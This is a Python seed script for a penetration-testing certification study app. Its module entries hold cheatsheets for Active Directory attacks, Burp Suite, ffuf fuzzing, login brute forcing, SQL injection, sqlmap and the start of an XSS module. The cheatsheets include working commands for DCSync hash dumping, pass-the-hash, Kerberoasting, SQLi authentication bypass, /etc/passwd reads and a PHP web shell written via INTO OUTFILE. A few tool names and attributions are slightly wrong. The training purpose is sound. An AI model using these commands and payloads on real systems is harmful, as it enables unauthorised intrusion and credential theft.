"""seed-3.12-3.24.py — High-fidelity content for CPTS modules 12-24"""
import json, os

root = os.path.join(os.path.dirname(__file__), '..')
seed = os.path.join(root, 'seed')

def load(fn):
    with open(os.path.join(seed, fn)) as f: return json.load(f)
def save(fn, data):
    with open(os.path.join(seed, fn), 'w') as f: json.dump(data, f, indent=2)

modules_expanded = load('modules-expanded.json')
exercises_expanded = load('exercises-expanded.json')
flashcards_expanded = load('flashcards-expanded.json')

existing_slugs    = {m['slug'] for m in modules_expanded}
existing_prompts  = {e['prompt'] for e in exercises_expanded}
existing_questions= {fc['question'] for fc in flashcards_expanded}

# ─────────────────────────────────────────────────────────────────────────────
# MODULE DATA (12-24)
# ─────────────────────────────────────────────────────────────────────────────
new_modules = [
{
  "title":"Active Directory Enumeration & Attacks","slug":"ad-enum-attacks","category":"Active Directory","order_index":12,
  "summary":"Active Directory is the central target in most enterprise penetration tests. Enumeration begins from an unauthenticated perspective (BloodHound with Anonymous bind, enumeration via LDAP null sessions, Kerbrute user enumeration) and escalates once credentials are obtained. Key attack chains: AS-REP Roasting → crack → Kerberoast → crack → lateral movement with nxc → DCSync → domain dominance. BloodHound/SharpHound graph analysis reveals shortest paths to Domain Admin including ACL abuse, constrained delegation, Resource-Based Constrained Delegation (RBCD), and group membership chains. PowerView, ldapsearch, and enum4linux-ng are the primary enumeration tools. AD attacks to master: Password spraying (net rpc / kerbrute / nxc), Kerberoasting, AS-REP Roasting, Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, DCSync, Golden/Silver Tickets, Shadow Credentials. Understanding the attack surface requires knowing AD components: LDAP, Kerberos, DNS, SYSVOL/NETLOGON shares, GPO processing, and trust relationships.",
  "cheatsheet_md":"<h3>Initial Enumeration (No Credentials)</h3><pre>kerbrute userenum -d corp.local --dc 10.10.10.5 users.txt   # User enumeration via Kerberos\nimpacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.5 -no-pass  # AS-REP Roast\nnmap -p 88,389,445,3268 --script ldap-rootdse 10.10.10.5     # LDAP root DSE info\nenum4linux-ng -A 10.10.10.5 -u '' -p ''                      # Null session enum</pre><h3>PowerView — Domain Enumeration</h3><pre># Import module\nImport-Module PowerView.ps1\n# or bypass: powershell -ep bypass -c \"Import-Module ./PowerView.ps1\"\n\nGet-Domain                                    # Basic domain info\nGet-DomainController                          # List all DCs\nGet-DomainUser -Properties SamAccountName,Description  # All users + descriptions\nGet-DomainUser -SPN                           # Kerberoastable accounts\nGet-DomainUser -PreauthNotRequired            # AS-REP Roastable\nGet-DomainGroup -Identity 'Domain Admins' | select member  # DA members\nGet-DomainComputer -Properties Name,OperatingSystem        # Computer OS inventory\nGet-DomainGPO                                 # List all GPOs\nFind-LocalAdminAccess                         # Where current user is local admin\nFind-InterestingDomainAcl                     # ACL misconfigurations\nGet-DomainTrust                               # Trust relationships</pre><h3>BloodHound Collection</h3><pre># SharpHound (Windows — from domain-joined or user context)\n./SharpHound.exe -c All --zipfilename bhdata.zip\n./SharpHound.exe -c All,GPOLocalGroup --stealth  # Stealth mode\n\n# BloodHound.py (Linux — no domain join required)\nbloudhound-python -d corp.local -u user -p pass -dc 10.10.10.5 -c All -ns 10.10.10.5\n\n# Start Neo4j + BloodHound\nsudo neo4j start\nbloudhound &\n# Upload zip → analysis → Shortest Paths to Domain Admins</pre><h3>Key BloodHound Queries</h3><pre># In BloodHound GUI → Analysis tab:\n\"Shortest Paths to Domain Admins from Owned Principals\"\n\"Find Principals with DCSync Rights\"\n\"Shortest Paths to Unconstrained Delegation Systems\"\n\"Find AS-REP Roastable Users\"\n\"Find Kerberoastable Users with Most Privileges\"</pre><h3>Kerberoasting</h3><pre>impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.5 -request -outputfile spns.txt\nhashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule\n# Windows:\nRubeus.exe kerberoast /outfile:spns.txt /nowrap</pre><h3>DCSync (Domain Admin or DS-Replication rights)</h3><pre>impacket-secretsdump corp.local/admin:pass@10.10.10.5 -just-dc-ntlm\nimpacket-secretsdump corp.local/admin:pass@10.10.10.5 -just-dc-user krbtgt\n# Gets krbtgt hash → Golden Ticket creation possible</pre><h3>Pass-the-Hash / Pass-the-Ticket</h3><pre># PTH with NetExec\nnxc smb 10.10.10.5 -u administrator -H NTLM_HASH\nevil-winrm -i 10.10.10.5 -u administrator -H NTLM_HASH\n\n# Pass-the-Ticket (Rubeus)\nRubeus.exe ptt /ticket:base64_ticket\nRubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt  # Overpass-the-Hash</pre>",
  "pitfalls_md":"<ul><li><b>Running SharpHound when EDR is active</b> — SharpHound generates massive LDAP queries that trigger alerts. Use --stealth and --CollectionMethods DCOnly first, then expand if needed.</li><li><b>Kerberoasting service accounts with AES256 only</b> — If the account only has AES256 keys (msDS-SupportedEncryptionTypes = 24), the TGS is encrypted with AES256 which is cracking-resistant. Focus on RC4-encrypted SPNs (type 23) first.</li><li><b>Ignoring descriptions field in user accounts</b> — AD admins frequently store passwords in the Description field. Always dump: Get-DomainUser -Properties SamAccountName,Description.</li><li><b>Not checking SYSVOL for Group Policy Preferences</b> — Old GPP XML files may contain cpassword fields (AES256-encrypted admin passwords with the public key). Tool: Get-GPPPassword.</li><li><b>Missing ACL-based attack paths</b> — BloodHound's 'Find-InterestingDomainAcl' reveals GenericAll, GenericWrite, WriteDACL, ForceChangePassword, and WriteOwner rights that enable privilege escalation without exploiting any CVE.</li></ul>",
  "exam_tips_md":"<ul><li>Run BloodHound collection as the very first action after obtaining any domain credential. The graph analysis will reveal your entire attack path — including paths you'd never discover manually.</li><li>Check user descriptions immediately: Get-DomainUser -Properties samaccountname,description | Where description. Passwords stored in descriptions are a frequent CPTS finding.</li><li>After DCSync and obtaining the krbtgt hash — store it safely. A Golden Ticket is valid for 10 years by default and survives password resets (unless krbtgt is reset twice in succession).</li><li>Don't overlook trust relationships. Get-DomainTrust reveals if the domain trusts another domain with SID filtering disabled — this enables SID History injection for cross-forest escalation.</li><li>Kerberoast ALL SPNs immediately after getting credentials. Even if you crack only one service account password, it may have local admin rights elsewhere that enable lateral movement.</li></ul>"
},
{
  "title":"Using Web Proxies","slug":"web-proxies","category":"Web Exploitation","order_index":13,
  "summary":"Web proxies — primarily Burp Suite — are the essential interface between the tester and the web application. Every web application attack begins with intercepting requests, understanding the application's data flow, and identifying injection points. Burp Suite's core tools: Proxy (intercept/modify requests), Repeater (manual request manipulation and testing), Intruder (automated fuzzing/brute-force), Scanner (automated vulnerability detection), Decoder (encoding/decoding), and Comparer (diff responses). OWASP ZAP is the free alternative with a similar feature set. Key workflow: configure browser proxy → intercept initial requests → map application endpoints → right-click to send to Repeater/Intruder → test injections manually in Repeater → automate with Intruder. Understanding HTTP is foundational: request methods (GET/POST/PUT/DELETE/OPTIONS/PATCH), headers (Host, Cookie, Authorization, Content-Type, User-Agent), status codes (200/301/302/401/403/404/500), and body encoding (URL-encoded, JSON, multipart/form-data). Burp extensions (SAML Raider, JWT Editor, Autorize) extend capability for modern applications.",
  "cheatsheet_md":"<h3>Burp Suite Setup</h3><pre># Configure browser proxy: 127.0.0.1:8080\n# Or use FoxyProxy extension (recommended)\n# Import Burp CA: http://burp → download cert → install in browser\n\n# CLI curl through Burp proxy:\ncurl -x http://127.0.0.1:8080 http://target.com/api/v1/users -k</pre><h3>Repeater — Manual Testing</h3><pre># Right-click any request in Proxy History → Send to Repeater\n# Modify parameters and resend with Ctrl+R\n# Compare responses for subtle differences\n\n# Key things to modify in Repeater:\n# - Inject SQL/XSS in every parameter\n# - Change HTTP method (GET → POST)\n# - Remove/add headers (X-Forwarded-For, Authorization)\n# - Test IDOR: change user IDs, GUIDs\n# - Modify Cookie values</pre><h3>Intruder — Automated Attacks</h3><pre># Attack Types:\n# Sniper: one wordlist, one position at a time\n# Battering Ram: same payload to all positions\n# Pitchfork: parallel wordlists, one per position\n# Cluster Bomb: all combinations of all wordlists (largest)\n\n# Common Intruder uses:\n# 1. Brute-force login: username + password positions (Cluster Bomb)\n# 2. Fuzz parameters: single parameter (Sniper)\n# 3. Directory/file discovery: path position (Sniper)\n\n# Note: Community Edition throttles Intruder — use ffuf/feroxbuster for speed</pre><h3>Useful Burp Shortcuts</h3><pre>Ctrl+R    → Send to Repeater\nCtrl+I    → Send to Intruder  \nCtrl+U    → URL encode selection\nCtrl+Shift+U → URL decode\nCtrl+B    → Base64 encode\nCtrl+Shift+B → Base64 decode\nF12       → Open DevTools</pre><h3>Match and Replace Rules</h3><pre># Proxy → Options → Match and Replace\n# Useful rules:\n# Replace: User-Agent with custom string\n# Add header: X-Forwarded-For: 127.0.0.1 (bypass IP restrictions)\n# Replace: admin=false with admin=true (parameter tampering)</pre><h3>curl Reference for Web Testing</h3><pre>curl -v http://target.com/login                     # Verbose (headers shown)\ncurl -x http://127.0.0.1:8080 -k http://target.com # Through Burp\ncurl -d 'user=admin&pass=test' http://target.com/login  # POST form\ncurl -H 'Cookie: session=abc123' http://target.com/admin  # Custom header\ncurl -X PUT -d '{\"admin\":true}' -H 'Content-Type: application/json' http://target.com/user/1\ncurl -b 'role=user' -c cookies.txt http://target.com  # Save/send cookies</pre>",
  "pitfalls_md":"<ul><li><b>Not importing the Burp CA certificate</b> — Without the CA cert, HTTPS sites show SSL errors and Burp can't intercept. Import via http://burp in the browser and add to trusted authorities.</li><li><b>Using Intruder Community Edition for brute-force</b> — Burp Community throttles Intruder to 1 request/second, making brute-force impractically slow. Use ffuf, hydra, or feroxbuster instead.</li><li><b>Forgetting to check all HTTP methods</b> — Many apps expose unintended functionality via PUT, DELETE, or PATCH. Always OPTIONS-scan and test non-standard methods on interesting endpoints.</li><li><b>Missing responses in non-200 status codes</b> — A 403 Forbidden response may contain useful application data (error messages, stack traces). A 302 redirect may redirect to a page that requires authentication — check the pre-redirect response body.</li><li><b>Not testing API endpoints found in JavaScript</b> — Modern SPAs make API calls to endpoints not visible in standard navigation. Review Proxy History and JS source files for hidden API endpoints.</li></ul>",
  "exam_tips_md":"<ul><li>Set up FoxyProxy with a Burp profile before the exam. Having a one-click proxy toggle saves significant time when switching between intercepted and direct browsing.</li><li>Use Burp's Site Map (Target tab) to build a complete picture of the application. Right-click domain → Spider or use the crawler to discover endpoints automatically.</li><li>The Repeater 'Change request method' button (right-click in Repeater) instantly converts GET to POST and vice versa — useful for testing method-based access control bypasses.</li><li>Save your Burp project file regularly during the exam. All request history, notes, and scanner findings are preserved. Use descriptive item names in the Target Site Map.</li><li>For JWT tokens: use the JWT Editor extension to decode, modify claims (e.g., alg:none attack, role escalation), and re-sign. This catches a significant number of auth bypass vulnerabilities in modern apps.</li></ul>"
},
{
  "title":"Attacking Web Applications with Ffuf","slug":"ffuf-fuzzing","category":"Web Exploitation","order_index":14,
  "summary":"Ffuf (Fuzz Faster you Fool) is the standard web fuzzing tool for directory discovery, parameter fuzzing, virtual host enumeration, and recursive content discovery. Unlike dirbuster or gobuster, ffuf uses the FUZZ keyword that can be placed anywhere in the request — URL path, parameters, headers, POST body, or Host header — giving it far greater flexibility. Understanding response filtering is critical: filtering by response code alone is insufficient because WAFs/applications return 200 for many errors. Filter by response size (-fs), word count (-fw), or line count (-fl) to eliminate false positives. Key wordlists: /usr/share/seclists/Discovery/Web-Content/ (directory-list-2.3-medium, raft-large-files, common.txt), /usr/share/seclists/Discovery/DNS/ for vhosts. Extension fuzzing (-e .php,.bak,.old,.txt) finds backup files. Recursive fuzzing (-recursion) automatically digs into discovered directories.",
  "cheatsheet_md":"<h3>Directory/File Discovery</h3><pre>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://target.com/FUZZ\nffuf -w wordlist.txt -u http://target.com/FUZZ -e .php,.txt,.bak,.old  # Extension fuzzing\nffuf -w wordlist.txt -u http://target.com/FUZZ -recursion -recursion-depth 2  # Recursive\nffuf -w wordlist.txt -u http://target.com/FUZZ -t 50 -rate 200  # 50 threads, 200 req/s</pre><h3>Response Filtering</h3><pre>ffuf -w wordlist.txt -u http://target.com/FUZZ -fc 404          # Filter 404s\nffuf -w wordlist.txt -u http://target.com/FUZZ -fc 404,403,400  # Filter multiple\nffuf -w wordlist.txt -u http://target.com/FUZZ -fs 1234         # Filter by size (bytes)\nffuf -w wordlist.txt -u http://target.com/FUZZ -fw 50           # Filter by word count\nffuf -w wordlist.txt -u http://target.com/FUZZ -fl 10           # Filter by line count\nffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302  # Match only these codes</pre><h3>Parameter Fuzzing</h3><pre># GET parameter discovery\nffuf -w params.txt -u 'http://target.com/index.php?FUZZ=value' -fs 1234\n# POST parameter discovery\nffuf -w params.txt -u http://target.com/search -X POST -d 'FUZZ=value' -H 'Content-Type: application/x-www-form-urlencoded' -fs 1234\n# Value fuzzing (known parameter, unknown value)\nffuf -w values.txt -u 'http://target.com/index.php?id=FUZZ' -fs 1234</pre><h3>Virtual Host Enumeration</h3><pre>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n  -u http://10.10.10.5 -H 'Host: FUZZ.target.com' -fs 1234  # Filter base response size</pre><h3>Output & Useful Flags</h3><pre>ffuf -w wordlist.txt -u http://target.com/FUZZ -o results.json -of json  # JSON output\nffuf -w wordlist.txt -u http://target.com/FUZZ -x http://127.0.0.1:8080  # Through Burp\nffuf -w wordlist.txt -u http://target.com/FUZZ -H 'Cookie: session=abc'  # Authenticated\nffuf -w wordlist.txt -u http://target.com/FUZZ -ic  # Ignore wordlist comments</pre>",
  "pitfalls_md":"<ul><li><b>Not filtering false positives before analyzing results</b> — Run ffuf once and note the default/error response size, then re-run with -fs [that size] to eliminate noise. Reviewing 40,000 unfiltered results is impractical.</li><li><b>Using too many threads against rate-limited applications</b> — High thread counts trigger rate limiting and bans. Use -t 10 -rate 100 for sensitive targets; only increase on non-rate-limited lab environments.</li><li><b>Missing backup file extensions</b> — .bak, .old, .swp, .~, .orig, .backup are commonly forgotten. Always fuzz extensions on discovered files: ffuf -w words.txt -u http://target.com/admin.FUZZ</li><li><b>Not fuzzing parameters on discovered PHP/ASPX pages</b> — Once a dynamic page is found, parameter discovery is critical. Use /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt.</li><li><b>Skipping vhost enumeration</b> — Many web servers serve different applications based on the Host header. Always enumerate vhosts on web servers, especially those without a hostname.</li></ul>",
  "exam_tips_md":"<ul><li>Always run ffuf with -o results.json to save output — review it later without re-running the scan. The JSON format is also importable into other tools.</li><li>Start with a small wordlist (common.txt ~4700 entries) for speed, then run a larger wordlist (directory-list-2.3-medium ~220k) in the background. Don't wait for the large scan to find obvious directories.</li><li>For authenticated fuzzing, capture the session cookie from Burp and pass it with -H 'Cookie: session=TOKEN'. Unauthenticated fuzzing misses large portions of authenticated applications.</li><li>Use --recursion-depth 2 for most targets — deeper recursive scans find subdirectories that flat scans miss. Combine with -fc 404 to keep output clean.</li><li>When fuzzing parameters, compare response sizes and times carefully. A parameter that changes the response size by even 5 bytes may indicate a valid parameter worth investigating manually in Burp Repeater.</li></ul>"
},
{
  "title":"Login Brute Forcing","slug":"login-brute-forcing","category":"Web Exploitation","order_index":15,
  "summary":"Login brute forcing requires understanding the target's authentication mechanism before selecting a tool and approach. HTTP Basic Auth uses Base64-encoded credentials in the Authorization header and is easily brute-forced with hydra. Form-based auth requires identifying the form fields and failure string — critical details for hydra's http-post-form module. API auth (Bearer tokens, API keys) may require token generation before brute-forcing. Modern applications implement defences: account lockout, rate limiting, CAPTCHA, and IP-based blocking. Strategies to bypass: password spraying (one cred against many users), slow brute-force (sleep between attempts), IP rotation (proxies), and CAPTCHA bypass (OCR or manual solving for low-volume attacks). Default credentials are frequently overlooked — check default admin passwords for the identified software version before attempting brute-force. Tools: hydra (versatile, supports 50+ protocols), medusa, nxc (AD environments), ffuf (web forms with FUZZ in payload position).",
  "cheatsheet_md":"<h3>Hydra — HTTP Form Brute-Force</h3><pre># Syntax: http-post-form '/path:body:F=failure_string'\n# F= means the string appears on FAILURE (login failed page)\n# S= means the string appears on SUCCESS\nhydra -l admin -P rockyou.txt 10.10.10.5 http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'\nhydra -L users.txt -P passwords.txt 10.10.10.5 http-post-form '/login:username=^USER^&password=^PASS^:F=Incorrect credentials'\n# With cookie (for authenticated pages post-login):\nhydra -l admin -P rockyou.txt 10.10.10.5 http-post-form '/admin/login:user=^USER^&pass=^PASS^:F=denied:H=Cookie: session=abc123'</pre><h3>Hydra — Common Protocols</h3><pre>hydra -l admin -P rockyou.txt ssh://10.10.10.5\nhydra -l root -P rockyou.txt ftp://10.10.10.5\nhydra -l admin -P rockyou.txt rdp://10.10.10.5 -t 4\nhydra -l admin -P rockyou.txt smb://10.10.10.5\nhydra -l admin -P rockyou.txt 10.10.10.5 http-get /admin  # HTTP Basic Auth\n# -t = threads (lower for rate-limited); -V = verbose</pre><h3>Custom Wordlist Generation</h3><pre># Username generation from a name\ncupp -i      # Interactive mode: generates personalised passwords from name/dob/pet\nusernameGenerator -n 'John Smith' -o usernames.txt  # username format permutations\n\n# Target-specific wordlist from website content:\ncewl http://target.com -d 3 -m 5 -o wordlist.txt  # Crawl site, min 5 char words\ncewl -w wordlist.txt --with-numbers http://target.com</pre><h3>Default Credentials Quick Reference</h3><pre># Check before brute-forcing!\nadmin:admin      # Generic, Tomcat manager\nadmin:password   # Many routers/cameras\nadmin:1234       # Some IoT devices\nroot:root        # MySQL, some Linux systems\nadmin:admin123   # WordPress admin\ntomcat:tomcat    # Apache Tomcat manager\nadmin:'' (blank) # Many management interfaces\n\n# Reference: github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/</pre><h3>Medusa</h3><pre>medusa -h 10.10.10.5 -u admin -P rockyou.txt -M http -m DIR:/login -m FORM:user=^USER^&pass=^PASS^:F=fail</pre>",
  "pitfalls_md":"<ul><li><b>Wrong failure string in hydra http-post-form</b> — The failure string must exactly match text on the failed login page. Check in Burp — a single space difference causes hydra to report every attempt as success.</li><li><b>Not checking for CSRF tokens</b> — Modern login forms include CSRF tokens that change per request. Standard hydra fails here. Use burp Intruder with the 'Recursive grep' feature or a custom script to extract and re-use CSRF tokens.</li><li><b>Account lockout triggering alerts</b> — Brute-forcing triggers lockout and alerts SOC teams. Always check lockout policy first. Prefer password spraying for AD environments.</li><li><b>Not trying default credentials first</b> — Before any brute-force attempt, try the top 10 default credentials manually. This takes 2 minutes and succeeds more often than a 2-hour brute-force run.</li><li><b>Using full rockyou.txt as first attempt</b> — rockyou.txt has 14 million entries. Start with a targeted small list (100-1000 most common passwords + contextual guesses) before committing to a full wordlist run.</li></ul>",
  "exam_tips_md":"<ul><li>ALWAYS try default credentials before brute-forcing. For every management interface (admin panel, CMS login, database admin), spend 2 minutes trying admin:admin, admin:password, and the application's documented defaults.</li><li>Use cewl to generate a custom wordlist from the target website — it often produces the exact passwords used by the target organisation (company name, product names, team names).</li><li>When hydra shows 'success' on every attempt, your failure string is wrong. Test the failure string manually in Burp first, then copy it exactly (including surrounding text for uniqueness).</li><li>For SSH brute-force, use -t 4 threads maximum — SSH is CPU-intensive on the server side and higher threads actually slow down the attack while increasing detection risk.</li><li>Combine cewl + cupp: cewl generates a site wordlist, cupp generates personalised passwords from names/dates found in the About page. The combined list often cracks passwords that rockyou.txt misses.</li></ul>"
},
{
  "title":"SQL Injection Fundamentals","slug":"sql-injection","category":"Web Exploitation","order_index":16,
  "summary":"SQL injection remains one of the most impactful web vulnerabilities — a single SQLi can lead to full database extraction, authentication bypass, file read/write, and even OS command execution. The fundamentals cover: error-based SQLi (extract data from error messages), union-based SQLi (append a UNION SELECT to extract data from additional tables), blind boolean-based SQLi (true/false question by changing response), blind time-based SQLi (SLEEP/WAITFOR for extraction when no response difference), and out-of-band SQLi (DNS/HTTP exfiltration). Mastering manual detection: single quote to break queries, comment sequences (-- , #, /**/) to terminate, and ORDER BY / UNION SELECT to enumerate columns. Database fingerprinting (MySQL vs. PostgreSQL vs. MSSQL vs. Oracle) determines which functions and techniques work. Understanding the information_schema database enables extracting table names, column names, and data from any database. In CPTS, SQLi is tested in GET/POST parameters, HTTP headers (User-Agent, Referer, Cookie), and JSON/XML body parameters.",
  "cheatsheet_md":"<h3>Detection</h3><pre># Basic injection test (break the query)\n' OR '1'='1\n' OR 1=1 --\n' OR 1=1 #\n')\n\"; -- \n\n# Error-triggering payloads:\n'                              # Single quote\n''                             # Two single quotes\n`                              # Backtick (MySQL)\n%27                            # URL-encoded single quote</pre><h3>MySQL Union-Based Extraction</h3><pre># Step 1: Find column count\nORDER BY 1 --    # Increase until error: ORDER BY 1,2,3... ORDER BY N = error means N-1 columns\n\n# Step 2: Find printable columns\nUNION SELECT 1,2,3 --    # Replace numbers with expressions to see which appear in output\n\n# Step 3: Extract data\nUNION SELECT 1,database(),3 --          # Current database name\nUNION SELECT 1,user(),3 --              # Current DB user\nUNION SELECT 1,@@version,3 --           # DB version\nUNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --\nUNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' --\nUNION SELECT 1,group_concat(username,':',password),3 FROM users --</pre><h3>Blind Boolean-Based</h3><pre># True condition (normal response): 1=1\n# False condition (different/empty response): 1=2\n\nid=1 AND 1=1 --    # True: normal response\nid=1 AND 1=2 --    # False: different response\n\n# Extract data character by character:\nid=1 AND SUBSTRING(database(),1,1)='a' --   # Is first char of DB name 'a'?\nid=1 AND ASCII(SUBSTRING(database(),1,1))>97 --   # Binary search on ASCII value</pre><h3>Time-Based Blind</h3><pre># MySQL: SLEEP()\nid=1; IF(1=1,SLEEP(5),0) --        # Delays 5s if true\nid=1 AND SLEEP(5) --\n\n# MSSQL: WAITFOR\nid=1; WAITFOR DELAY '0:0:5' --\n\n# PostgreSQL: pg_sleep()\nid=1; SELECT pg_sleep(5) --</pre><h3>File Read/Write (MySQL)</h3><pre># Read files (requires FILE privilege + secure_file_priv=''):\nSELECT LOAD_FILE('/etc/passwd')                 -- Read local file\nUNION SELECT 1,LOAD_FILE('/etc/passwd'),3 --\n\n# Write web shell (requires write perm to web root):\nSELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'</pre><h3>Auth Bypass Payloads</h3><pre># Login bypass (admin account)\nadmin'--\nadmin'#\n' OR 1=1--\n' OR '1'='1'--\nadmin') --</pre>",
  "pitfalls_md":"<ul><li><b>Not URL-encoding payloads in GET requests</b> — Special characters (#, spaces, &) in GET parameters must be URL-encoded. Use Burp Decoder or %20 for space, %23 for #, %27 for single quote when testing in the URL bar.</li><li><b>Guessing column count instead of using ORDER BY</b> — ORDER BY is reliable; UNION SELECT with wrong column count returns an error. Increment ORDER BY until you get an error, then use N-1 columns.</li><li><b>Forgetting that UNION must have same column count AND compatible data types</b> — If UNION fails with correct count, check data types. Use NULL instead of numbers: UNION SELECT NULL,NULL,NULL to avoid type conflicts.</li><li><b>Not testing all input fields</b> — SQLi can occur in search boxes, ordering parameters, pagination, hidden fields, Cookie values, and HTTP headers. Don't stop at the login form.</li><li><b>Missing second-order SQLi</b> — Data stored in the database (un-sanitised) that is later retrieved and used in a query without sanitisation. Requires testing the application flow across multiple requests.</li></ul>",
  "exam_tips_md":"<ul><li>Use Burp Repeater for all manual SQLi testing — modify and resend instantly. Add the request to Repeater before testing so you can compare responses side by side.</li><li>When UNION-based works: extract database(), user(), @@version first to confirm DB type and privilege level, then go straight to information_schema for table/column discovery.</li><li>Blind SQLi is slow manually — use sqlmap for automated extraction once you confirm blind SQLi is present. Manual confirmation first, then automate: sqlmap -r request.txt --dbms=mysql --level=3 --risk=2.</li><li>Check if the DB user has FILE privilege: SELECT super_priv FROM mysql.user WHERE user=user(). If yes, try LOAD_FILE('/etc/passwd') and INTO OUTFILE for web shell deployment.</li><li>For MSSQL: if xp_cmdshell is enabled or you have SA-level SQL access, SQL injection escalates to full OS RCE. Check EXEC xp_cmdshell 'whoami' after gaining SQL injection.</li></ul>"
},
{
  "title":"SQLMap Essentials","slug":"sqlmap","category":"Web Exploitation","order_index":17,
  "summary":"SQLMap automates SQL injection detection and exploitation across all database types. While manual confirmation is essential before running SQLMap aggressively, the tool dramatically accelerates data extraction from confirmed injection points. Key concepts: --level controls the depth of testing (1-5, default 1); --risk controls test aggressiveness (1-3, default 1); higher values find more but may cause errors or lockouts. The -r flag (request file from Burp) is the most reliable way to target complex POST requests with cookies, tokens, and custom headers. The --dbs, --tables, --columns, --dump flags extract the database hierarchy. --os-shell attempts to obtain an interactive OS shell when file read/write privileges are available. --batch runs non-interactively without prompts. Tamper scripts (--tamper) bypass WAFs by encoding payloads. In CPTS, sqlmap is used after manual confirmation of a SQLi vulnerability to efficiently extract credentials, data, and potentially achieve RCE.",
  "cheatsheet_md":"<h3>Basic Usage</h3><pre># GET parameter\nsqlmap -u 'http://target.com/item.php?id=1' --batch\n\n# POST parameter\nsqlmap -u 'http://target.com/login' --data='user=admin&pass=test' --batch\n\n# From Burp request file (most reliable)\nsqlmap -r request.txt --batch\n# Save request from Burp: right-click → Save item, or: Ctrl+S in Repeater\n\n# Specify parameter\nsqlmap -u 'http://target.com/?id=1&cat=2' -p id  # Only test id parameter</pre><h3>Database Enumeration</h3><pre>sqlmap -r request.txt --dbs                    # List all databases\nsqlmap -r request.txt -D targetdb --tables     # List tables in targetdb\nsqlmap -r request.txt -D targetdb -T users --columns  # List columns\nsqlmap -r request.txt -D targetdb -T users --dump     # Dump all data\nsqlmap -r request.txt -D targetdb -T users -C username,password --dump  # Specific columns\nsqlmap -r request.txt --dump-all --exclude-sysdbs  # Dump all non-system DBs</pre><h3>Increasing Detection Rate</h3><pre>sqlmap -r request.txt --level=5 --risk=3       # Maximum depth/aggression\nsqlmap -r request.txt --dbms=mysql             # Specify DB type (faster)\nsqlmap -r request.txt --technique=U            # Union-based only\nsqlmap -r request.txt --technique=BT           # Boolean + Time-based\nsqlmap -r request.txt --string='Welcome'       # Success string for blind\nsqlmap -r request.txt --not-string='Login failed'  # Failure string</pre><h3>WAF Bypass (Tamper Scripts)</h3><pre>sqlmap -r request.txt --tamper=space2comment    # Replaces space with /**/ \nsqlmap -r request.txt --tamper=between          # Replaces > with NOT BETWEEN\nsqlmap -r request.txt --tamper=randomcase       # rAnDoM cAsE SQL keywords\nsqlmap -r request.txt --tamper=base64encode     # Base64 encode payloads\n# Chain tampers:\nsqlmap -r request.txt --tamper=space2comment,randomcase</pre><h3>OS Shell / File Access</h3><pre>sqlmap -r request.txt --os-shell                # Interactive OS shell\nsqlmap -r request.txt --file-read='/etc/passwd' # Read file\nsqlmap -r request.txt --file-write=shell.php --file-dest=/var/www/html/shell.php  # Write file</pre>",
  "pitfalls_md":"<ul><li><b>Running sqlmap without confirming SQLi manually first</b> — Automated tools generate enormous log traffic and may trigger WAF bans. Confirm the injection point manually in Burp Repeater before unleashing sqlmap.</li><li><b>Not using -r with POST requests and cookies</b> — Manually constructing POST data and cookie strings in sqlmap is error-prone. Always use -r request.txt for complex requests.</li><li><b>Forgetting --batch on automated runs</b> — Without --batch, sqlmap pauses for user input on every question. Use --batch for unattended runs.</li><li><b>Not specifying --dbms when you know the technology</b> — sqlmap defaults to testing all database types. Specifying --dbms=mysql dramatically reduces runtime and irrelevant payloads.</li><li><b>Expecting --os-shell to always work</b> — OS shell requires FILE privilege + writable web directory (MySQL) or xp_cmdshell enabled (MSSQL). Confirm manually before relying on this.</li></ul>",
  "exam_tips_md":"<ul><li>Save every interesting request as a .txt file from Burp Repeater. This gives you a clean sqlmap -r target for every confirmed SQLi without reconstructing headers.</li><li>Start with sqlmap -r request.txt --dbs --batch. If the database list appears, you have confirmed UNION-based or error-based SQLi and can proceed with confidence to --dump.</li><li>For blind SQLi that sqlmap confirms but extraction is slow: use --technique=B (boolean) with --level=3 and a specific column list (-C username,password) to limit extraction volume.</li><li>--os-shell on MSSQL with SA privileges is your fastest path to OS command execution from SQLi. Try it before complex payload chains.</li><li>If sqlmap fails on a WAF-protected target, try --tamper=space2comment,randomcase,between combined. Also try --random-agent to rotate User-Agent and bypass naive WAF signatures.</li></ul>"
},
{
  "title":"Cross-Site Scripting (XSS)","slug":"xss","category":"Web Exploitation","order_index":18,
  "summary":"XSS vulnerabilities enable injecting client-side JavaScript into web pages viewed by other users. Three types: Reflected XSS (payload in request, returns in response — no storage, requires user to click a crafted link), Stored XSS (payload persists in database and executes for all viewers — highest impact), and DOM-based XSS (JavaScript reads attacker-controlled input and writes it to the DOM without server-side involvement). In penetration testing, XSS is demonstrated by achieving JavaScript execution (alert/confirm/prompt) first, then escalating to: session cookie theft (document.cookie → send to attacker), credential phishing (inject fake login form), keylogging, screenshot capture, and CSRF token theft. The impact of XSS scales with the victim's privileges — XSS on an admin panel allows admin-level actions to be performed via the victim's browser. Tools: BeEF (Browser Exploitation Framework) hooks victims and enables post-exploitation scenarios. Polyglot payloads bypass filters that block specific patterns.",
